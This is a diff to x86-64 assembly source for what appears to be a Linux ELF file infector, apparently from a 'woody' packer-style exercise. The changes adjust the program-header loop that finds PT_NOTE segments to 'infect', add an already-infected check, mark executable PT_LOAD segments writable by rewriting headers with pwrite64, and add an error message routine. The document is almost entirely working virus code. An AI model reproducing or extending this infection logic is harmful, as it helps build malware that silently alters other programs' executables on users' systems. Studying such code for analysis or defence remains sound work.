@@ -82,7 +82,7 @@ _start:
   syscall
 
   cmp rax, 0
-  jl exit_error
+  jl exit_one
 
   mov r8, rax ; store fd in r8
 
@@ -98,7 +98,7 @@ _start:
     syscall ; open
 
     cmp rax, 0
-    jl exit_error
+    jl exit_one
 
     mov r9, rax ; store fd in r9
 
@@ -200,13 +200,20 @@ _start:
     syscall
 
     cmp byte [r15 + PHDR_TYPE], PT_NOTE ; check if type is PT_NOTE
-    je .infect ; we found, start infecting
+    jne .check_pt_load 
+
+    cmp byte[r15 + IS_INFECTED], 1 ; already infected?
+    jne infect ; start infecting
+
+    .check_pt_load:
+      cmp byte[r15 + PHDR_TYPE], PT_LOAD ; check if type is PT_LOAD
+      jne not_executable
 
     mov edi, dword [r15 + PHDR_FLAGS] ; load flags
     and edi, PF_X
 
     cmp edi, PF_X
-    jne .not_executable ; ph is not executable, don't mark it as writable
+    jne not_executable ; ph is not executable, don't mark it as writable
 
     or dword [r15 + PHDR_FLAGS], PF_W ; mark flag as writable
 
@@ -217,7 +224,7 @@ _start:
     mov rax, SYS_PWRITE64
     syscall
 
-    .not_executable:
+    not_executable:
     inc rbx ; add one to phdr loop counter
 
     cmp bx, word [r15 + EHDR_PHNUM] ; have we looped through all phdr ?
@@ -231,7 +238,7 @@ _start:
       add r8w, word [r15 + EHDR_PHENTSIZE] ; increment by ehdr_phentsize
       jmp loop_phdr ; loop back
 
-  .infect:
+  infect:
     mov [r15 + PHDR_LOOP_COUNTER], bx ; store
     mov [r15 + PHDR_LOOP_OFFSET], r8w ; store
 
@@ -631,7 +638,7 @@ _start:
     mov bx, [r15 + PHDR_LOOP_COUNTER] ; restore
     mov r8w, [r15 + PHDR_LOOP_OFFSET] ; restore
     mov byte [r15 + IS_INFECTED], 1
-    jmp loop_phdr
+    jmp not_executable
 
 cleanup:
   mov rdi, [r15 + FD]
@@ -665,6 +672,19 @@ exit_error:
     syscall ; open
 
 exit_one:
+  call show_err ; pushing db 'woody' on stack
+  err_msg:
+    db 'Error', 0xa
+    err_len equ $ - err_msg
+
+    show_err:
+      pop rsi ; popping 'Error' in rsi
+      mov rax, SYS_WRITE
+      mov rdi, STDERR
+      mov rdx, err_len
+      syscall
+
+
   mov rdi, 1 ; exit code 1
   mov rax, SYS_EXIT
   syscall
